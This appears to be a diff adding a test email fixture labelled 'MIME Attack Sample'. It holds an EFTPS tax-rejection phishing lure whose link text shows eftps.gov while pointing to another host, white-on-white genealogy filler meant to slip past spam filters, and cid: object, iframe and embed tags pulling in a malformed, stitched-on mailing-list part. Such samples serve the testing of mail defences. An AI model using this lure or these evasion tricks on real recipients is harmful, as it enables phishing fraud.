@@ -1,0 +1,106 @@
+From: mrhappy@telkom.net
+To: askchristine@avistautilities.com
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+  charset=Windows-1252
+Content-Transfer-Encoding: 7bit
+Content-Length: 3552
+Lines: 48
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1731
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY>
+
+<b>Your Federal Tax Payment ID: 01037579 has been rejected.</b> <br />
+  Return Reason Code R21 - The identification number used in the Company
+  Identification Field is not valid. <br />
+  Please, check the information and refer to Code R21 to get details
+  about your company payment in transaction contacts section: <br />
+  <font  color="#FFFFFF">He mamed (1) Elizabeth UNKNOWN about 1803. </font></span><br />
+  <a href="http://images.afa.net/2rwef5e/news3.html">http://eftps.gov/R21</a> <br />
+  In other way forward information to your accountant adviser.</p>
+<p> <font  color="#FFFFFF">Morgan, b. 8 Aug 195 1, Tuskegee,Macon,AL. </font></span><br />
+    <b>EFTPS: <br />
+      The Electronic Federal Tax Payment System</b> <br />
+  <b>PLEASE NOTE:</b> Your tax payment is due regardless of EFTPS online <br />
+  availability. In case of an emergency, you can always make your tax <br />
+  payment by calling the EFTPS.&nbsp;</p>
+<font  color="#FFFFFF">
+and Mae Spraggins. Robert was born 12 Aug 1915 in Caddo, Bryan, OK and died 4 Mar I Known children of William Wright DOROUGH and Catherine CAIN are: 
+</font><font  color="#FFFFFF">
++76. m xi. William Charles Carroll DOROUGH, born 11 Jun 1842, died 1 Mar 1905. Ellison made pension application for War of 1812 in Heard Co., he served in John Wilson's Company, William Dock Adams: Married Jerrel Dean (Jerry) Harshaw, 15 Apr 1958 in Alarnogordo, Otero, 
+</font><font  color="#FFFFFF">
+and Elizabeth WRIGHT. Joseph died 9 Aug 1868 in Dunavant, Shelby, AL, at the age of 71. Dinah Catherine Dorough: Married (2) Ignacio Sillas-Humara in Comfort, Kendall, Texas, 7 Feb 1993. 96. f xx. M. DORROUGH, born 1855, died before 1870 in AL. From 1860 census of Shelby Co. unknown. 
+</font><font  color="#FFFFFF">
++53. m i. John Rohert GROSS, born about 1819, died after 1865. 22. f i. Peggy DOROUGH, born about 1776. She married John COCHRAN 10 Nov 1803 in 
+</font><font  color="#FFFFFF">
+Known children of Sintha DOROUGH and Green B. EDMONDSON are: Frances T. Ingmire. Miranda. 
+</font><font  color="#FFFFFF">
+33. Sintha DOROUGH was born about 1808 in Morgan County, Georgia. She was the daughter of Thomas Milton Court of Shelby County, AL by Lydia Margaret Watts Dorrough in 1894. +48. m vi. Willis R. DOROUGH, born 1812, died 10 Nov 1863. 13. Joan Marie Robinson b. 14 Jul 1955, Opelika,Lee,AL, m. 29 Dec 1973, in Opelika, Lee, AL, Thomas 
+</font><font  color="#FFFFFF">
+111. Nancy DOROUGH, born about 1825. I m i Robert Wilburn McKey, Jr. born 9 Nov 1944 in Macon, Bill, GA. 
+</font><font  color="#FFFFFF">
+and owning 16 slaves. While in Upson County he had served as a Justice of the Peace. He married ASENATH. She was born about 1800. GENERATION NO. 2 I 
+</font><font  color="#FFFFFF">
+m ii Base1 Snyder. 21. f x. Victoria DOROUGH, born 17 Feb 1750 in James City County, Virginia. ,Randolph,AL. 
+</font><font  color="#FFFFFF">
++14. f i Felicia Dean Allen b. 12 Dec 1966. 9. f viii. Annie DOROUGH, born 10 Mar 1716 in James City County, Virginia. 
+</font><font  color="#FFFFFF">
+Thomas married (2) Nancy B. .She was born about 1829. brothers, Presley, Elliso~ arid Cliarles after gr-arr(1rrrotlier- Elizabeth died. +52. f x. Martha Ann DOROUGH, born 1824. 
+</font><font  color="#FFFFFF">
+Initial information received showed John L. to have been in Benton County, AL by 1834. However, he is listed Known children of James L. DOROUGH and Elizabeth WRIGHT are: 
+</font>
+</p>
+
+
+</BODY></HTML>
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+On Mon, Jun 18, 2007 at 06:00:22AM EST, William Hubbs wrote:
+> -----BEGIN PGP SIGNED MESSAGE-----
+> Hash: SHA1
+> 
+> All,
+> 
+> because of this bug [1], gentoo linux will be dropping support for speakup in its official kernels starting at 2.6.22.
+> 
+> [1] http://bugs.gentoo.org/show_bug.cgi?id=177794
+
+I'd also like to point out that Ubuntu will be offering 2.6.22, and even 
+though speakup has been dropped, unless a solution for 2.6.22 is worked 
+out, speakup will also not work with the Next Ubuntu release.
+- -- 
+Luke Yelavich
+GPG key: 0xD06320CE 
+	 (http://www.themuso.com/themuso-gpg-key.txt)
+Email & MSN: themuso@themuso.com
+Jabber: themuso@jabber.org.au
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+iD8DBQFGdbUgjVefwtBjIM4RAmZlAKCdelQRK9rD52iwmSrUmZT4qpRPJwCeMuar
+GwJbGptIWhj6q4sbfghlXFw=
+=f44H
+-----END PGP SIGNATURE-----
+
+____
+--BOUNDARY--
+--DELIMITER--
